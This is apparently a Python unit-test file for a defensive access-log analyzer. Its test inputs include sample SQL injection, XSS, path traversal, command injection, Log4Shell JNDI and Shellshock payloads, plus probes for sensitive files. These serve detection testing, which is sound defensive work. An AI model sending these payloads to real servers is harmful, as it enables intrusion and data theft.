"""Testes do analisador de access.log (nginx/Apache)."""

import os
import unittest

import dashboard
import web_log_analyzer as web

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
SAMPLE = os.path.join(ROOT, "sample_access.log")


def line(path, status=200, ua="Mozilla/5.0", method="GET", ip="198.51.100.1", size=100):
    return f'{ip} - - [27/Nov/2026:10:00:00 -0300] "{method} {path} HTTP/1.1" {status} {size} "-" "{ua}"'


def kind(path, ua="Mozilla/5.0"):
    return web.classify_request(web.parse_request_line(line(path, ua=ua)))


class TestParse(unittest.TestCase):
    def test_combined_format(self):
        req = web.parse_request_line(line("/produto.php?id=1", status=404, ua="sqlmap/1.8"))
        self.assertEqual(req["ip"], "198.51.100.1")
        self.assertEqual(req["method"], "GET")
        self.assertEqual(req["path"], "/produto.php?id=1")
        self.assertEqual(req["status"], 404)
        self.assertEqual(req["ua"], "sqlmap/1.8")

    def test_not_an_access_log(self):
        self.assertIsNone(web.parse_request_line("Nov 22 02:47:10 web01 sshd[1]: Failed password for root"))

    def test_nginx_hex_escape_is_decoded(self):
        req = web.parse_request_line(line("/busca?q=\\x22onerror=alert(1)"))
        self.assertEqual(web.classify_request(req), "xss")


class TestSignatures(unittest.TestCase):
    def test_sqli(self):
        for path in ["/p.php?id=1%27%20OR%20%271%27=%271", "/p.php?id=1+UNION+SELECT+1,2",
                     "/p.php?id=1%20AND%20SLEEP(5)", "/p.php?id=1'", "/p.php?id=1%20AND%201=1"]:
            self.assertEqual(kind(path), "sqli", path)

    def test_xss(self):
        self.assertEqual(kind("/busca?q=%3Cscript%3Ealert(1)%3C/script%3E"), "xss")

    def test_traversal(self):
        self.assertEqual(kind("/download?file=..%2F..%2Fetc%2Fpasswd"), "traversal")
        self.assertEqual(kind("/download?file=%252e%252e%252fetc%252fpasswd"), "traversal")   # dupla codificação

    def test_rce_in_path_and_user_agent(self):
        self.assertEqual(kind("/ping?host=1.1.1.1;cat%20/etc/hosts"), "rce")
        self.assertEqual(kind("/", ua="${jndi:ldap://198.51.100.99/a}"), "rce")
        self.assertEqual(kind("/cgi-bin/x", ua="() { :; }; /bin/bash -c id"), "rce")

    def test_sensitive_files(self):
        for path in ["/.env", "/.git/config", "/backup.sql", "/wp-config.php.bak", "/phpinfo.php"]:
            self.assertEqual(kind(path), "sensitive", path)

    def test_normal_requests_are_not_attacks(self):
        for path in ["/", "/produtos?page=2&ordem=preco", "/static/app.css", "/blog/o-que-e-sql",
                     "/busca?q=rock+and+roll", "/environment"]:
            self.assertIsNone(kind(path), path)


class TestLogin(unittest.TestCase):
    def events(self, statuses, path="/wp-login.php"):
        lines = [line(path, status=s, method="POST", ip="203.0.113.50") for s in statuses]
        return web.web_events_from_lines(lines)

    def test_form_login_redirect_means_success(self):
        evs = self.events([200, 200, 302])
        self.assertEqual([e["login"] for e in evs], ["fail", "fail", "success"])

    def test_api_login_2xx_means_success(self):
        evs = self.events([401, 200], path="/api/login")
        self.assertEqual([e["login"] for e in evs], ["fail", "success"])

    def test_compromise_after_threshold(self):
        alerts = web.detect_login_compromise(self.events([200] * 5 + [302]), threshold=5)
        self.assertEqual(len(alerts), 1)
        self.assertEqual(alerts[0]["failures"], 5)

    def test_no_compromise_below_threshold(self):
        self.assertEqual(web.detect_login_compromise(self.events([200] * 4 + [302]), threshold=5), [])


class TestTools(unittest.TestCase):
    def test_user_agents(self):
        cases = {"sqlmap/1.8.11#stable (https://sqlmap.org)": "sqlmap",
                 "Mozilla/5.00 (Nikto/2.5.0) (Evasions:None)": "Nikto",
                 "gobuster/3.6": "Gobuster",
                 "Mozilla/5.0 (Hydra)": "Hydra",
                 "python-requests/2.32": "Script Python",
                 "Mozilla/5.0 (X11; Linux x86_64) Firefox/131.0": "Navegador"}
        for ua, tool in cases.items():
            self.assertEqual(web.detect_tool(ua)[0], tool, ua)


class TestSampleDashboard(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.data = dashboard.analyze(SAMPLE)
        cls.by_ip = {a["ip"]: a for a in cls.data["attackers"]}

    def test_detects_web_kind(self):
        self.assertEqual(self.data["kind"], "web")

    def test_risk_levels(self):
        expected = {"198.51.100.23": "critico", "203.0.113.50": "critico", "203.0.113.9": "alto",
                    "203.0.113.200": "alto", "198.51.100.77": "medio", "192.0.2.44": "baixo"}
        self.assertEqual({ip: a["risk"] for ip, a in self.by_ip.items()}, expected)

    def test_all_sqlmap_payloads_detected(self):
        self.assertEqual(self.by_ip["203.0.113.9"]["failed"], 10)

    def test_tools(self):
        self.assertEqual(self.by_ip["203.0.113.9"]["tool"], "sqlmap")
        self.assertEqual(self.by_ip["198.51.100.77"]["tool"], "Gobuster")
        self.assertEqual(self.by_ip["203.0.113.200"]["tool"], "Exploit no user-agent")

    def test_verdict_and_findings(self):
        self.assertEqual(self.data["verdict"]["level"], "critico")
        types = [f["type"] for f in self.data["findings"]]
        self.assertEqual(types[:2], ["web_sensitive_exposed", "web_login_compromise"])
        for expected in ["web_sqli", "web_rce", "web_traversal", "web_xss", "web_scanning"]:
            self.assertIn(expected, types)

    def test_legit_visitor_is_quiet(self):
        visitor = self.by_ip["192.0.2.44"]
        self.assertEqual(visitor["failed"], 0)
        self.assertEqual(visitor["techniques"], [])


if __name__ == "__main__":
    unittest.main()
